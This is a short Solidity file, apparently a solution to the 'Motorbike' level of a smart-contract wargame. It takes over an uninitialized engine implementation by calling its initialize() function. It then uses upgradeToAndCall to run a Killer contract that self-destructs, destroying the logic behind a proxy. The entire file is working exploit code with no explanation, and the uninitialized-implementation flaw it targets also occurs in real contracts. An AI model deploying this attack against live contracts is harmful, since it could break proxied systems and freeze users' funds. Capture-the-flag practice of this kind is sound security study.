// SPDX-License-Identifier: MIT
pragma solidity <0.7.0;

interface IEngine {
    function initialize() external;

    function upgradeToAndCall(address newImplementation, bytes memory data)
        external
        payable;
}

contract Killer {
    event Destruct(address);

    function kill() public {
        emit Destruct(address(this));
        selfdestruct(payable(address(0)));
    }
}

contract MotorbikeAttack {
    constructor(address engine, address killer) public {
        IEngine(engine).initialize();
        IEngine(engine).upgradeToAndCall(
            killer,
            abi.encodeWithSelector(Killer.kill.selector)
        );
    }
}
